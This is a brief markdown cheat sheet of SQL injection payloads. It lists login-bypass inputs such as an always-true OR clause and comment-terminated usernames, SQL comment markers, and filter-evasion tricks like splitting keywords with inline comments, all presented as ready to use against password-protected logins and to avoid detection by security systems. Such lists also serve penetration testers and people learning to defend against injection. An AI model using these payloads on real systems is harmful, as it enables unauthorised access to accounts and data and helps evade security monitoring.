# SQL Injection Payloads
## Bypass password
These inputs can be used to bypass password restricted logins
```sql
username' OR '1'='1
username'
username'--
```

## Comments
```sql
--
#
/* */
```

## Filter Bypass
Use these to avoid detection from security systems
```sql
SEL/**/ECT
' like '-- Use this instead of '='
```
